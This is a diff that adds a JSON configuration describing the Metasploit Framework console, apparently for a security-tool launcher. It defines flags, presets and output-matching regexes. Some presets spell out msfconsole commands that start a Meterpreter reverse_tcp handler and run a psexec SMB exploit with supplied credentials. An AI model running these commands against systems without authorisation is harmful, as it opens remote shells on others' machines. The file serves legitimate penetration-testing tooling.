@@ -1,0 +1,120 @@
+{
+  "tool": {
+    "id": "metasploit-framework",
+    "name": "metasploit-framework",
+    "description": "World's most used penetration testing framework - exploits, payloads, post modules",
+    "executable": "msfconsole",
+    "runtime": "ruby",
+    "runtimeVersion": "3.2",
+    "launchMode": "cli",
+    "category": "exploit",
+    "subcategory": "framework",
+    "tier": "optional",
+    "tags": ["exploit", "framework", "post-exploit", "payload"],
+    "install": {
+      "method": "homebrew",
+      "source": "metasploit"
+    },
+    "params": [
+      {
+        "label": "Resource Script",
+        "flag": "-r",
+        "type": "string",
+        "description": "Auto-run a resource script (.rc) with msf commands",
+        "placeholder": "auto.rc"
+      },
+      {
+        "label": "Single Command",
+        "flag": "-x",
+        "type": "string",
+        "description": "Run msf commands then exit (semicolon separated)",
+        "placeholder": "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; run"
+      },
+      {
+        "label": "Quiet",
+        "flag": "-q",
+        "type": "boolean",
+        "description": "No banner / less output"
+      },
+      {
+        "label": "DB Connect",
+        "flag": "-y",
+        "type": "string",
+        "description": "Database YAML config",
+        "placeholder": "~/.msf4/database.yml"
+      },
+      {
+        "label": "No DB",
+        "flag": "-n",
+        "type": "boolean",
+        "description": "Disable database (faster startup)"
+      },
+      {
+        "label": "Logging",
+        "flag": "-L",
+        "type": "boolean",
+        "description": "Read commands from STDIN, log to STDOUT"
+      }
+    ],
+    "skills": [
+      {
+        "id": "interactive",
+        "name": "Interactive console",
+        "description": "Just open msfconsole",
+        "args": "",
+        "tags": ["interactive"]
+      },
+      {
+        "id": "quiet-no-db",
+        "name": "Fast start (no banner, no DB)",
+        "description": "Quick scratch console",
+        "args": "-q -n",
+        "tags": ["fast"]
+      },
+      {
+        "id": "auto-rc",
+        "name": "Run resource script",
+        "description": "Replay a saved msf workflow",
+        "args": "-r {{resource_script}}",
+        "tags": ["automation"]
+      },
+      {
+        "id": "handler",
+        "name": "Spawn reverse_tcp handler",
+        "description": "One-shot multi/handler for x64 meterpreter",
+        "args": "-x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST {{lhost}}; set LPORT {{lport}}; set ExitOnSession false; exploit -j\"",
+        "tags": ["handler", "meterpreter"]
+      },
+      {
+        "id": "import-nmap",
+        "name": "Import nmap XML to msf DB",
+        "description": "Pull port/service data into msf workspace",
+        "args": "-x \"db_import {{nmap_xml}}; hosts; services\"",
+        "tags": ["pipeline"]
+      },
+      {
+        "id": "psexec-smb",
+        "name": "Run psexec exploit",
+        "description": "Quick SMB psexec with creds",
+        "args": "-x \"use exploit/windows/smb/psexec; set RHOSTS {{target}}; set SMBUser {{user}}; set SMBPass {{pass}}; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST {{lhost}}; run\"",
+        "tags": ["smb", "windows"]
+      }
+    ],
+    "output": {
+      "format": "text",
+      "produces": ["session", "info"],
+      "detect": "msf6|Metasploit Framework|\\[\\*\\] Started",
+      "patterns": [
+        {
+          "type": "session",
+          "regex": "Meterpreter session (\\d+) opened \\(([\\d\\.:]+)\\s+->\\s+([\\d\\.:]+)\\)",
+          "fields": {
+            "1": "session_id",
+            "2": "lhost",
+            "3": "rhost"
+          }
+        }
+      ]
+    }
+  }
+}
